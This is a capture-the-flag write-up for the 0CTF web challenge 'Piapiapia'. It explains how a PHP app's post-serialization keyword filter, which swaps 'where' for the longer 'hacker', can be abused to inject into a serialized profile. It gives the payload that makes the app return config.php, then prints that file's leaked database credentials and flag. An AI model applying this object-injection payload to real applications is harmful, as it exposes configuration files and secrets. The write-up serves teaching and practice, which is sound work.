## Piapiapia (Web, 6p)
	
###ENG
[PL](#pl-version)

We get a page and its source. It looks like flag is stored inside config.php.
All inputs seem pretty well validated but 'nickname' doesn't handle arrays well.
Validation is skipped when passed as 'nickname[]='.

SQL injection will be hard, as all backslashes and "unsafe" words are removed:
```php
function filter($string) {
	$escape = array('\'', '\\\\');
	$escape = '/' . implode('|', $escape) . '/';
	$string = preg_replace($escape, '_', $string);

	$safe = array('select', 'insert', 'update', 'delete', 'where');
	$safe = '/' . implode('|', $safe) . '/i';
	return preg_replace($safe, 'hacker', $string);
}
```
The problem is, it's sanitized *after* being serialized:
```php
$user->update_profile($username, serialize($profile));

public function update_profile($username, $new_profile) {
	$username = parent::filter($username);
	$new_profile = parent::filter($new_profile);

	$where = "username = '$username'";
	return parent::update($this->table, 'profile', $new_profile, $where);
}
```

Replacing "where" with "hacker" changes the length of the string.
Allowing us to replace part of serialized object with our content.
We replace photo file name with "config.php":
```php
$payload = "\";}s:5:\"photo\";s:10:\"config.php\";}\";";
$POST['nickname[]'] = str_repeat("where", strlen($payload)).$payload;
```
After this, "config.php" is returned as base64 encoded data uri:
```php
<?php
	  $config['hostname'] = '127.0.0.1';
	  $config['username'] = '0ctf';
	  $config['password'] = 'oh-my-**-web';
	  $config['database'] = '0CTF_WEB';
	  $flag = '0ctf{fa717b49649fbb9c0dd0d1663469a871}';
?>
```
###PL version
